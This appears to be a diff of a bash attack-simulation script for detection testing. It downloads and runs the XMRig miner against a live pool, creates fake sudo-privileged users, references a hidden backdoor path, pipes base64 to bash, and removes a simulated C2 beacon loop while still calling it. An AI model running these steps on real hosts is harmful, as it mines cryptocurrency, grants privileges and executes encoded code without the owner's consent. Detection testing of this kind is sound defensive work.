@@ -11,23 +11,31 @@ USER_COUNT=5                  # Number of fake users to create
 BACKDOOR_FILE="/usr/bin/.openbackdoor"  # Simulated malicious binary path
 declare -a CREATED_USERS      # Array to store added usernames
 
-# === 1. Download and run a known miner binary ===
+# === 1. Install and run xmrig ===
+
 download_xmrig() {
-  if [ ! -f /tmp/xmrig-demo ]; then
-    echo "[1] Downloading XMRig to /tmp/xmrig-demo..."
-    curl -sL "$XMRIG_URL" -o /tmp/xmrig.tar.gz
-    mkdir -p "$TMP_DIR"
-    tar -xvzf /tmp/xmrig.tar.gz -C "$TMP_DIR"
-    mv "$TMP_DIR"/xmrig-*/xmrig /tmp/xmrig-demo
-    chmod +x /tmp/xmrig-demo
-    rm -rf "$TMP_DIR" /tmp/xmrig.tar.gz
+  XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz"
+  INSTALL_DIR="$HOME/xmrig-demo"
+  BINARY="$INSTALL_DIR/xmrig"
+
+  if [ ! -f "$BINARY" ]; then
+    echo "[1] Downloading XMRig to $BINARY..."
+    mkdir -p "$INSTALL_DIR"
+    curl -sL "$XMRIG_URL" -o "$INSTALL_DIR/xmrig.tar.gz"
+    tar -xvzf "$INSTALL_DIR/xmrig.tar.gz" -C "$INSTALL_DIR"
+    # Move the binary to a clean path
+    mv "$INSTALL_DIR"/xmrig-*/xmrig "$BINARY"
+    chmod +x "$BINARY"
+    # Clean up the leftover extracted folders
+    rm -rf "$INSTALL_DIR"/xmrig-* "$INSTALL_DIR/xmrig.tar.gz"
   else
-    echo "[1] XMRig already exists at /tmp/xmrig-demo"
+    echo "[1] XMRig already exists at $BINARY"
   fi
 
   echo "[1] Running XMRig (simulated miner activity)..."
-  /tmp/xmrig-demo --url=donate.v2.xmrig.com:3333 --user=localtest --donate-level=0 --tls=false &
+  "$BINARY" --url=donate.v2.xmrig.com:3333 --user=localtest --donate-level=0 --tls=false &
 }
+
 
 # === 2. Add fake privileged users ===
 add_privileged_users() {
@@ -46,45 +54,13 @@ add_privileged_users() {
   done
 }
 
-# === 3. Simulate connections to fake C2 server ===
-simulate_c2_connection() {
-  local C2_HOST="metasploit.com"
-  local C2_PORT=9999
-  local C2_IP="172.31.37.105"
-  local DURATION=300  # total time to run in seconds
-
-  echo "[3] Simulating fake C2 callbacks to $C2_HOST:$C2_PORT with random intervals for $DURATION seconds..."
-
-  local START_TIME
-  START_TIME=$(date +%s)
-
-  while true; do
-    CURRENT_TIME=$(date +%s)
-    ELAPSED=$((CURRENT_TIME - START_TIME))
-
-    if (( ELAPSED >= DURATION )); then
-      echo "  [✔] C2 simulation completed after $DURATION seconds."
-      break
-    fi
-
-    echo "  [>] Sending simulated C2 callback at $(date +%T)..."
-    curl -s "http://$C2_HOST" --resolve "$C2_HOST:$C2_PORT:$C2_IP" || true
-
-    # Generate a random sleep interval between 3 and 15 seconds
-    SLEEP_TIME=$((RANDOM % 13 + 3))
-    echo "  [i] Sleeping for $SLEEP_TIME seconds..."
-    sleep "$SLEEP_TIME"
-  done
-}
-
-
-# === 4. Run a suspicious-looking base64 command ===
+# === 3. Run a suspicious-looking base64 command ===
 run_base64_payload() {
   echo "[4] Running a suspicious base64-encoded command..."
   echo "ZWNobyAiU3VzcGljaW91cyBhY3Rpdml0eSBleGVjdXRlZCIK" | base64 -d | bash
 }
 
-# === 5. Cleanup Function to Undo Simulation Changes ===
+# === 4. Cleanup Function to Undo Simulation Changes ===
 cleanup_simulation() {
   echo "[5] Cleaning up simulation artifacts..."
 
@@ -100,10 +76,15 @@ cleanup_simulation() {
     sudo rm -f "/etc/sudoers.d/$user"
   done
 
-  # Remove XMRig binary and backdoor
-  echo "  [-] Deleting XMRig binary and backdoor file..."
-  sudo rm -f /tmp/xmrig-demo
-  sudo rm -f "$BACKDOOR_FILE"
+  # Remove XMRig binary and directory
+  echo "  [-] Deleting XMRig install directory..."
+  rm -rf "$HOME/xmrig-demo"
+
+  # Remove backdoor file if defined
+  if [ -n "$BACKDOOR_FILE" ]; then
+    echo "  [-] Removing backdoor file..."
+    rm -f "$BACKDOOR_FILE"
+  fi
 
   echo "[✔] Cleanup completed successfully."
 }
@@ -116,11 +97,6 @@ add_privileged_users
 simulate_c2_connection
 run_base64_payload
 sleep 600
-
-echo "Attack Simulation terminating, cleaning up..."
-sleep 5
-echo
 cleanup_simulation
-echo 
-sleep 5
+sleep 1
 echo "Host cleanup done"
